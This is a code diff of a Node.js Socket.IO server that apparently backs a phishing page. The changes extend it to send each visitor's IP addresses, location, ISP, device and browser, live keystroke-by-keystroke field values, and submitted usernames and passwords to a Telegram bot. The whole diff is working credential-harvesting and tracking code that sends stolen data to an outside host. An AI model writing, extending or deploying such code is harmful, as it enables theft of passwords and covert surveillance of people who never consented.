@@ -16,6 +16,7 @@ app.use(cors());
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// Send message to Telegram
 function sendTelegram(message){
     axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
         chat_id: CHAT_ID,
@@ -33,23 +34,40 @@ io.on("connection",(socket)=>{
         console.log("Visitor Data:", data);
 
         sendTelegram(`⚠️ New Visitor
-IPv6: ${data.ipv6}
-IPv4: ${data.ipv4}
-Location: ${data.city}, ${data.region}, ${data.country}`);
+
+🌐 IPv6: ${data.ipv6}
+🌐 IPv4: ${data.ipv4}
+
+📍 Location: ${data.city}, ${data.region}, ${data.country}
+
+🏢 ISP: ${data.isp}
+
+📱 Device: ${data.device}
+
+🌍 Map: ${data.map}
+
+🌐 Browser: ${data.browser}
+`);
     });
 
-    // typing tracking
+    // Track typing
     socket.on("typing",(data)=>{
-        sendTelegram(`Typing
+        sendTelegram(`⌨️ Typing
+
 Field: ${data.field}
 Value: ${data.value}`);
     });
 
-    // final form submit
+    // Final form submission
     socket.on("submit",(data)=>{
         sendTelegram(`✅ Final Submission
+
 Username: ${data.username}
-Age: ${data.password}`);
+Password: ${data.password}`);
+    });
+
+    socket.on("disconnect",()=>{
+        console.log("User disconnected");
     });
 
 });
